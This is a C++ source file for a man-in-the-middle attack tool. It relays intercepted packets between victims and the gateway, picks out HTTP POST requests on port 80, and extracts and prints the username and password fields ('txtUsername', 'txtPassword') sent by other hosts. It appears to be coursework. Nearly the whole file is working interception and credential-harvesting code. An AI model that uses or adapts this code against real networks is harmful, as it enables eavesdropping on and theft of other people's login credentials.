#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include "../header/mitmAttack.h"
#include <unistd.h>
#include <netinet/tcp.h>


bool mitmAttack::checkIsHTTP(const uint8_t* buffer, int bufferSize)
{
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    if(bufferSize < 0 || (size_t)bufferSize < ethHdrSize)
    {
        return false;
    }
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    uint8_t protocol = ipHeader->protocol;
    if(protocol != IPPROTO_TCP)
    {
        return false;
    }
    size_t ipHdrSize = ipHeader->ihl * 4;
    if(bufferSize < 0 || (size_t)bufferSize < ethHdrSize + ipHdrSize)
    {
        return false;
    }
    tcphdr* tcpHeader = reinterpret_cast<tcphdr*>(start + ethHdrSize + ipHdrSize); 
    uint16_t port = ntohs(tcpHeader->dest);
    return (port == 80);
}

std::string mitmAttack::getHTTPpayload(const uint8_t* buffer, int bufferSize)
{
    // we ignore buffer size check before TCP header since this function is called after checkIsHTTP
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    // std::cout << "[INFO] getHTTPpayload: ipHeader->tot_len " << ntohs(ipHeader->tot_len) << std::endl;
    // std::cout << "[INFO] getHTTPpayload: bufferSize - ethHdrSize " << bufferSize - ethHdrSize << std::endl;
    if(ntohs(ipHeader->tot_len) > bufferSize - ethHdrSize) 
    {
        // actual size may larger than amount ip header record, because of padding
        // but it can't be smaller
        return "";
    }
    size_t ipHdrSize = ipHeader->ihl * 4;
    tcphdr* tcpHeader = reinterpret_cast<tcphdr*>(start + ethHdrSize + ipHdrSize); 
    size_t tcpHdrSize = tcpHeader->doff * 4;
    uint8_t* HTTPheader = start + ethHdrSize + ipHdrSize + tcpHdrSize;
    size_t HTTPSize = bufferSize - ethHdrSize - ipHdrSize - tcpHdrSize;
    std::stringstream ss;
    ss.write(reinterpret_cast<char*>(HTTPheader), HTTPSize);
    std::string HTTPline;
    getline(ss, HTTPline);
    // std::cerr << "[INFO] getHTTPpayload: HTTPline " << HTTPline << std::endl;
    if(HTTPline.find("POST") == std::string::npos)
    {
        return "";
    }
    while(HTTPline != "\r")
    {
        // std::cerr << "[INFO] getHTTPpayload: HTTPline " << HTTPline << std::endl;
        getline(ss, HTTPline);
    }
    std::string payload;
    while(getline(ss, HTTPline))
    {
        payload += HTTPline + "\n";
    }
    return payload;
}
void mitmAttack::extractHTTPpayload(std::string& payload)
{
    size_t start = payload.find("txtUsername=");
    size_t mid;
    if(start == std::string::npos)
    {
        return;
    }
    start += 12;
    mid = payload.find("&txtPassword=", start);
    if(mid == std::string::npos)
    {
        return;
    }
    std::string username = payload.substr(start, mid - start);
    start = mid + 13;
    std::string password = payload.substr(start);
    password.pop_back(); // remove last '\n'
    std::cout << "Username: " << username << std::endl;
    std::cout << "Password: " << password << std::endl;
}

void mitmAttack::processPackets(const char* interface) {
    uint32_t gatewayIp = util::getDefaultGateway(interface);
    std::array<uint8_t, 6> gatewayMac;
    if(IPToMac.find(gatewayIp) == IPToMac.end()) {
        util::errquit("processPackets: gateway not found");
    }
    gatewayMac = IPToMac[gatewayIp];
    
    uint8_t buffer[65536];
    size_t bufferSize = sizeof(buffer);

    while(true) 
    {
        int recvSize = ip.receivePacketToMe(buffer, bufferSize);
        // ethhdr* ethHeader = reinterpret_cast<ethhdr*>(buffer);
        iphdr* ipHeader = reinterpret_cast<iphdr*>(buffer + sizeof(ethhdr));
        uint32_t destIp = ipHeader->daddr;
        if(ip.checkNeedRedirect(ipHeader))
        {
            // std::cerr << "[INFO] processPackets: received packet from " << util::ipToString(ipHeader->saddr) << " to " << util::ipToString(ipHeader->daddr) << std::endl;
            // std::cerr << "[INFO] processPackets: redirecting packet to " << util::ipToString(destIp) << std::endl;
            std::array<uint8_t, 6> trueDestMac;
            if (IPToMac.find(destIp) == IPToMac.end()) {
                trueDestMac = gatewayMac;
            }
            else
            {
                trueDestMac = IPToMac[destIp];
            }
            ip.redirectPacket(buffer, trueDestMac);

            if(checkIsHTTP(buffer, recvSize))
            {
                // std::cerr << "[INFO] processPackets: HTTP packet found" << std::endl;
                std::string payload = getHTTPpayload(buffer, recvSize);
                extractHTTPpayload(payload);
            }

        }
    }
}
